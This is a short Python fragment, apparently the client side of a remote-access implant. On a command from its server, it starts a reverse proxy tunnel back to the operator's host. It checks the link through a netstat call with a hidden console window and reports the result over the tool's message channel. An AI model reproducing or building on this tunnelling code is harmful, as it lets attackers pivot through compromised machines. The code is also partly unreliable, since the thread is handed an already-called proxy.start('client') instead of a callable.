import subprocess
import time
import threading
import subprocess

def is_connection_established(host, remote_port):
    try:
        netstat_output = subprocess.check_output(
            f'netstat -ano | findstr "{host}:{remote_port}"',
            shell=True,
            stderr=subprocess.STDOUT,
            creationflags=subprocess.CREATE_NO_WINDOW
        ).decode('utf-8')
        if "ESTABLISHED" in netstat_output.upper():
            return True
        return False
    except subprocess.CalledProcessError:
        return False
    
def start_reverseproxy(self, data):
    try:
        port = data.get("port")
        if not port:
            raise ValueError("Port not provided in data")
        
        try:
            proxy = self.reverseproxy(
                listen_host='127.0.0.1', # Not used in client mode
                listen_port=0000,       # Not used in client mode
                server_host=self.host,  # IP of the server to connect to
                server_port=port,       # Port of the server to connect to
                socks_port=0000        # Not used in client mode
            )
            threading.Thread(target=proxy.start('client'), daemon=True).start()

            time.sleep(5)

            if is_connection_established(self.host, port):
                message = "Connected"
            else:
                message = "Not connected"

        except Exception as e:
            raise RuntimeError(f"Failed to start reverse proxy: {e}")

        self.send_message('response', self.converter.encode({"reverseproxy": message}))

    except Exception as e:
        self.send_message('response', self.converter.encode({"reverseproxy_logger": f"From Client: {str(e)}"}))